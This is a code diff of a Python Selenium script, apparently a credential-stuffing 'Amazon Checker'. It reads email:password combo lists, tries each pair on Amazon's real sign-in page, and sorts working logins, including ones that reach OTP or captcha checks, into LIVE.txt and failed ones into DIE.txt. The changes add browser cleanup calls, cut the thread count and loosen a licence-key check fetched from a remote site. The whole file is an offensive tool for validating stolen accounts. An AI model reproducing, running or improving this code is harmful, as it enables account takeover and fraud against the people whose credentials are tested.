@@ -55,7 +55,7 @@ class checker(object):
                 #driver = webdriver.Chrome()
                 options = webdriver.ChromeOptions()
                 options.add_experimental_option('excludeSwitches', ['enable-logging'])
-                options.add_argument("headless")
+                #options.add_argument("headless")
                 driver = webdriver.Chrome(options=options)
                 driver.get("https://www.amazon.com/ap/signin?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&forceValidateCaptcha=true&use_audio_captcha=false&pageId=usflex&openid.return_to=https%3A%2F%2Fwww.amazon.com%2Fgp%2Fcss%2Fhomepage.html%2F146-0546965-4550715%3Fie%3DUTF8%26%252AVersion%252A%3D1%26%252Aentries%252A%3D0&prevRID=PFZZJD687NH684H7RF9Z&openid.assoc_handle=usflex&openid.mode=checkid_setup&openid.ns.pape=http%3A%2F%2Fspecs.openid.net%2Fextensions%2Fpape%2F1.0&prepopulatedLoginId=eyJjaXBoZXIiOiJRWnhMd3o5enh6MWhtbGkrQVdpUVV3PT0iLCJJViI6IjVMbUs5RnA1MG5MRWlNRGFiT2t5emc9PSIsInZlcnNpb24iOjF9&failedSignInCount=2&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&ubid=135-1584179-7213821")
                 assert "Amazon" in driver.title
@@ -81,6 +81,7 @@ class checker(object):
                     f = open("DIE.txt", "a+")
                     f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                     f.close()
+                    driver.quit()
                     driver.close()
                 else:
                     sleep(3)
@@ -95,6 +96,7 @@ class checker(object):
                         f = open("LIVE.txt", "a+")
                         f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                         f.close()
+                        driver.quit()
                         driver.close()
                     elif """To better protect your account, please re-enter your password and then enter the characters as they are shown in the image below.""" in driver.page_source:
                         print(Fore.LIGHTGREEN_EX + "Processing....")
@@ -118,6 +120,7 @@ class checker(object):
                             f = open("DIE.txt", "a+")
                             f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                             f.close()
+                            driver.quit()
                             driver.close()
                         elif """Authentication required""" in driver.page_source:
                             good += 1
@@ -125,6 +128,7 @@ class checker(object):
                             f = open("LIVE.txt", "a+")
                             f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|OTP\n".format(email, password))
                             f.close()
+                            driver.quit()
                             driver.close()
                         elif """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                             good += 1
@@ -132,6 +136,7 @@ class checker(object):
                             f = open("LIVE.txt", "a+")
                             f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|OTP\n".format(email, password))
                             f.close()
+                            driver.quit()
                             driver.close()
                         elif """This is required if your sign-in looks different because you’ve cleared your cookies or you're signing from a different browser, device, or location.""" in driver.page_source:
                             good += 1
@@ -139,6 +144,7 @@ class checker(object):
                             f = open("LIVE.txt", "a+")
                             f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|Check Mail Live or OTP to login \n".format(email, password))
                             f.close()
+                            driver.quit()
                             driver.close()
                         elif """Enter the characters as they are given in the challenge.""" in driver.page_source:
                             try:
@@ -170,6 +176,7 @@ class checker(object):
                                         f = open("DIE.txt", "a+")
                                         f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                                         f.close()
+                                        driver.quit()
                                         driver.close()
                                     elif """We will send you a One Time Password (OTP) to authenticate your request.""" in driver.page_source:
                                         good += 1
@@ -177,6 +184,7 @@ class checker(object):
                                         f = open("LIVE.txt", "a+")
                                         f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|OTP\n".format(email, password))
                                         f.close()
+                                        driver.quit()
                                         driver.close()
                                     elif """Authentication required""" in driver.page_source:
                                         good += 1
@@ -184,6 +192,7 @@ class checker(object):
                                         f = open("LIVE.txt", "a+")
                                         f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|OTP\n".format(email, password))
                                         f.close()
+                                        driver.quit()
                                         driver.close()
                                     #elif """This is required if your sign-in looks different because you’ve cleared your cookies or you're signing from a different browser, device, or location.""" in driver.page_source:
                                     else:
@@ -192,6 +201,7 @@ class checker(object):
                                         f = open("LIVE.txt", "a+")
                                         f.write("LIVE - Checked by Jin - Amazon Checker|{}|{}|Check Mail Live or OTP to login \n".format(email, password))
                                         f.close()
+                                        driver.quit()
                                         driver.close()
                                     break
                             except:
@@ -205,6 +215,7 @@ class checker(object):
                         f = open("DIE.txt", "a+")
                         f.write("DIE - Checked by Jin - Amazon Checker|{}|{}\n".format(email, password))
                         f.close()
+                        driver.quit()
                         driver.close()
                     break
                 break
@@ -232,12 +243,14 @@ class checker(object):
 
     def threads(self):
         self.combo_loader()
-        self.threads = 5
+        self.threads = 1
         pool = Pool(self.threads)
         try:
             for _ in pool.imap_unordered(self.sender, self.combo_list):
                 pass
         except KeyboardInterrupt:
+            driver.quit()
+            driver.close()
             _exit(0)
 
         print("Done!")
@@ -250,8 +263,9 @@ if __name__ == "__main__":
     print("Please enter Key Below")
     while True:        
         keyCheck = requests.get('https://rgunz.net/captcha/amz.txt')
+        keyCheck_final = keyCheck.text.splitlines()
         _key = input("Key: ")
-        if _key == keyCheck.text:
+        if _key in keyCheck_final:
             combo_name = input("Combo Name: ")
             print("")
             checker(combo_name).threads()
